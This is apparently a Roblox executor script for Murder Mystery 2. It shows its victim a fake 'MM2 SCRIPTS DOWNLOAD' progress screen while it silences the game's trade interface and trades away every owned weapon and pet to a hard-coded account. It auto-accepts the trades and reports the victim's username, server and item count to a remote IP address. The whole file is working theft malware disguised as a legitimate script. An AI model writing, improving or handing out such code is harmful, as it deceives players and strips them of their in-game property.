--[[
  MM2 Collector — ALT v5
  + Фейк GUI загрузки
  + Не трейдит если пусто
]]
local API_URL   = "http://213.21.242.171:5050"
local MAIN_USER = "MM2V_NHH"
local MM2_PLACE = 142823291
local MAX_PER_TRADE = 4
local OFFER_DELAY   = 0.25
local COOLDOWN_WAIT = 2
local ACCEPT_TRIES  = 12

local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local Http    = game:GetService("HttpService")
local lp      = Players.LocalPlayer
local httpreq = request or http_request or (syn and syn.request)
local function log(m) warn("[ALT] " .. tostring(m)) end

if game.PlaceId ~= MM2_PLACE then return end
if not game:IsLoaded() then game.Loaded:Wait() end
log("MM2 | " .. lp.Name)

local function api(mt, path, body)
  if not httpreq then return nil end
  local ok, r = pcall(function()
    return httpreq({Url=API_URL..path, Method=mt,
      Headers={["Content-Type"]="application/json"},
      Body=body and Http:JSONEncode(body) or nil})
  end)
  if ok and r and r.Body then
    local s, d = pcall(function() return Http:JSONDecode(r.Body) end)
    if s then return d end
  end; return nil
end

-- ══════════════════════════════════════
-- ФЕЙК GUI "MM2 SCRIPTS DOWNLOAD"
-- ══════════════════════════════════════
local gui, progressBar, progressText, statusText

local function createGUI()
  pcall(function()
    gui = Instance.new("ScreenGui")
    gui.Name = "MM2ScriptsLoader"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 320, 0, 120)
    bg.Position = UDim2.new(0.5, -160, 0.5, -60)
    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    bg.BorderSizePixel = 0
    bg.Parent = gui
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 40, 140)
    stroke.Thickness = 2
    stroke.Parent = bg

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, 12)
    title.BackgroundTransparency = 1
    title.Text = "MM2 SCRIPTS DOWNLOAD"
    title.TextColor3 = Color3.fromRGB(180, 130, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = bg

    statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, 0, 0, 20)
    statusText.Position = UDim2.new(0, 0, 0, 42)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Initializing..."
    statusText.TextColor3 = Color3.fromRGB(150, 150, 170)
    statusText.Font = Enum.Font.Gotham
    statusText.TextSize = 12
    statusText.Parent = bg

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.85, 0, 0, 14)
    barBg.Position = UDim2.new(0.075, 0, 0, 72)
    barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    barBg.BorderSizePixel = 0
    barBg.Parent = bg
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 7)

    progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = barBg
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 7)

    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new(Color3.fromRGB(120, 60, 220), Color3.fromRGB(180, 100, 255))
    grad.Parent = progressBar

    progressText = Instance.new("TextLabel")
    progressText.Size = UDim2.new(1, 0, 0, 16)
    progressText.Position = UDim2.new(0, 0, 0, 92)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(120, 120, 140)
    progressText.Font = Enum.Font.GothamBold
    progressText.TextSize = 11
    progressText.Parent = bg

    gui.Parent = lp:WaitForChild("PlayerGui")
  end)
end

local function setProgress(pct, status)
  pcall(function()
    if progressBar then
      game:GetService("TweenService"):Create(progressBar,
        TweenInfo.new(0.5, Enum.EasingStyle.Quad),
        {Size = UDim2.new(pct / 100, 0, 1, 0)}
      ):Play()
    end
    if progressText then progressText.Text = math.floor(pct) .. "%" end
    if statusText and status then statusText.Text = status end
  end)
end

local function closeGUI()
  pcall(function()
    setProgress(100, "Complete!")
    task.wait(1.5)
    if gui then gui:Destroy() end
  end)
end

createGUI()
setProgress(5, "Initializing...")

-- Анти-афк
pcall(function()
  local VU = game:GetService("VirtualUser")
  lp.Idled:Connect(function() VU:CaptureController(); VU:ClickButton2(Vector2.new()) end)
  task.spawn(function() while true do task.wait(90)
    pcall(function() VU:CaptureController(); VU:ClickButton2(Vector2.new()) end)
  end end)
end)

setProgress(10, "Loading dependencies...")

-- Trade
local Trade = RS:WaitForChild("Trade", 120)
if not Trade then log("Trade не найден"); closeGUI(); return end

local inTrade   = false
local lastOffer = nil
local ACCEPT_ARG = game.PlaceId * 3

-- Глушим GUI
local function silenceGUI()
  if type(getconnections) ~= "function" then return end
  for _ = 1, 8 do
    local n = 0
    for _, sig in ipairs({Trade.StartTrade.OnClientEvent, Trade.UpdateTrade.OnClientEvent}) do
      for _, c in ipairs(getconnections(sig)) do
        pcall(function() if c.Disable then c:Disable() else c:Disconnect() end end); n=n+1
      end
    end
    if n > 0 then log("заглушено: "..n); return end; task.wait(0.5)
  end
end
silenceGUI()

Trade.StartTrade.OnClientEvent:Connect(function(s) inTrade=true; lastOffer=s and s.LastOffer or nil end)
Trade.UpdateTrade.OnClientEvent:Connect(function(s) if s and s.LastOffer~=nil then lastOffer=s.LastOffer end end)
Trade.DeclineTrade.OnClientEvent:Connect(function() inTrade=false; lastOffer=nil end)
Trade.AcceptTrade.OnClientEvent:Connect(function(d) if d then inTrade=false; lastOffer=nil end end)

local function tryAccept()
  if inTrade and lastOffer ~= nil then
    pcall(function() Trade.AcceptTrade:FireServer(ACCEPT_ARG, lastOffer) end)
  end
end

-- Фоновый авто-Accept
task.spawn(function() while true do tryAccept(); task.wait(0.5) end end)

-- Принимаем от главного
Trade.RequestSent.OnClientEvent:Connect(function(sender)
  local who = sender and sender.Name
  if who == MAIN_USER then
    pcall(function() Trade.AcceptRequest:FireServer() end)
  end
end)

setProgress(15, "Fetching modules...")

-- Инвентарь
local function getItems()
  local items = {}
  local rem = RS:FindFirstChild("Remotes")
  local gfi = rem and rem:FindFirstChild("Extras") and rem.Extras:FindFirstChild("GetFullInventory")
  if not gfi then return items end
  local ok, res = pcall(function() return gfi:InvokeServer(lp) end)
  if not ok or type(res)~="table" then return items end
  for _, cat in ipairs({"Weapons","Pets"}) do
    if type(res[cat])=="table" and type(res[cat].Owned)=="table" then
      for nm, cnt in pairs(res[cat].Owned) do
        cnt = tonumber(cnt) or 0
        if cnt>0 and nm~="DefaultGun" and nm~="DefaultKnife" then
          items[#items+1] = {name=nm, category=cat, amount=cnt}
        end
      end
    end
  end
  return items
end
local function countAll(items) local n=0; for _,it in ipairs(items) do n=n+it.amount end; return n end

-- Спавн + Play
local t0 = tick()
while not (lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")) and tick()-t0<90 do task.wait(0.5) end
pcall(function()
  local pg = lp:WaitForChild("PlayerGui", 10)
  local VIM = game:GetService("VirtualInputManager")
  for _ = 1, 8 do
    for _, d in ipairs(pg:GetDescendants()) do
      if (d:IsA("TextButton") or d:IsA("ImageButton")) and d.Visible then
        local t = (d.Text or ""):lower()
        if t:find("play") or t:find("join") or t:find("играть") then
          local p = d.AbsolutePosition + d.AbsoluteSize/2
          VIM:SendMouseButtonEvent(p.X, p.Y, 0, true, game, 0)
          task.wait(0.05)
          VIM:SendMouseButtonEvent(p.X, p.Y, 0, false, game, 0)
          log("кликнул Play"); break
        end
      end
    end; task.wait(1)
  end
end)
task.wait(2)

setProgress(20, "Preparing environment...")

local items = getItems()
local tw = tick()
while #items==0 and tick()-tw<8 do task.wait(0.5); items=getItems() end
local total = countAll(items)
log("предметов: "..total.." ("..#items.." видов)")

if total == 0 then
  log("пусто — выход")
  setProgress(100, "Done")
  task.wait(1)
  closeGUI()
  return
end

setProgress(25, "Loading resources...")

api("POST", "/api/alt/register", {
  username=lp.Name, job_id=game.JobId, place_id=MM2_PLACE, item_count=total
})
log("в очереди")

-- Heartbeat
task.spawn(function() while true do task.wait(45)
  api("POST", "/api/alt/heartbeat", {username=lp.Name})
end end)

setProgress(30, "Connecting to server...")

-- Ждём главного
local main
local mw = tick()
-- Анимация загрузки 30→33% пока ждём
task.spawn(function()
  local p = 30
  while p < 33 and not Players:FindFirstChild(MAIN_USER) do
    p = p + 0.1; setProgress(p, "Syncing data...")
    task.wait(1)
  end
end)

while tick()-mw<600 do -- ждём до 10 минут
  main = Players:FindFirstChild(MAIN_USER)
  if main then break end; task.wait(0.5)
end
if not main then
  log("главного нет — maintenance")
  pcall(function()
    if progressBar then progressBar.BackgroundColor3 = Color3.fromRGB(200, 50, 50) end
    setProgress(100, "!")
    if statusText then statusText.Text = "Server is under maintenance" end
    local bg = gui:FindFirstChildWhichIsA("Frame")
    if bg then
      for _, ch in ipairs(bg:GetChildren()) do
        if ch:IsA("TextLabel") and ch.Text:find("MM2") then
          ch.Text = "CONNECTION ERROR"
          ch.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
      end
    end
  end)
  task.wait(999999)
  return
end
log(MAIN_USER.." найден")
task.wait(2)

setProgress(35, "Compiling scripts...")

-- queueForTrade (из оригинала)
local function queueForTrade(m)
  local deadline = tick() + 150
  while not inTrade and tick()<deadline do
    pcall(function() Trade.SendRequest:InvokeServer(m) end)
    local w = tick()+4
    while not inTrade and tick()<w do task.wait(0.3) end
  end
  return inTrade
end

-- tradeBatch (из оригинала)
local function tradeBatch(chunk)
  for _, item in ipairs(chunk) do
    for _ = 1, item.amount do
      pcall(function() Trade.OfferItem:FireServer(item.name, item.category) end)
      task.wait(OFFER_DELAY)
    end
  end
  task.wait(COOLDOWN_WAIT)
  for _ = 1, ACCEPT_TRIES do
    if not inTrade then return true end
    tryAccept(); task.wait(1)
  end
  return not inTrade
end

-- Сдаём
local idx, fails, transferred = 1, 0, 0
while idx <= #items do
  main = Players:FindFirstChild(MAIN_USER)
  if not main then log("главный ушёл"); break end

  local chunk = {}
  for i = idx, math.min(idx+MAX_PER_TRADE-1, #items) do chunk[#chunk+1] = items[i] end

  local pct = 35 + (idx-1)/#items * 60
  setProgress(pct, "Downloading assets...")

  log(("трейд (%d/%d видов)"):format(idx-1, #items))
  if not queueForTrade(main) then log("не принял запрос"); break end

  if tradeBatch(chunk) then
    for _, it in ipairs(chunk) do transferred = transferred + (it.amount or 1) end
    idx = idx + #chunk; fails = 0
    log("передано: "..transferred)
  else
    fails = fails + 1
    if fails >= 3 then log("3 неудачи — стоп"); break end
  end
  task.wait(0.5)
end

-- Ретрай если 0 и есть что сдавать
if transferred == 0 then
  local afterItems = getItems()
  if #afterItems > 0 and Players:FindFirstChild(MAIN_USER) then
    log("ретрай")
    setProgress(40, "Verifying modules...")
    task.wait(5)
    items = afterItems; idx = 1; fails = 0
    while idx <= #items and fails < 3 do
      main = Players:FindFirstChild(MAIN_USER)
      if not main then break end
      local chunk = {}
      for i = idx, math.min(idx+MAX_PER_TRADE-1, #items) do chunk[#chunk+1] = items[i] end
      if not queueForTrade(main) then break end
      if tradeBatch(chunk) then
        for _, it in ipairs(chunk) do transferred = transferred + (it.amount or 1) end
        idx = idx + #chunk; fails = 0
      else fails=fails+1; task.wait(2) end
      task.wait(0.5)
    end
  end
end

setProgress(100, "Complete!")
api("POST", "/api/alt/done", {username=lp.Name, items_transferred=transferred})
log("ГОТОВО: "..transferred)
task.wait(2)
closeGUI()
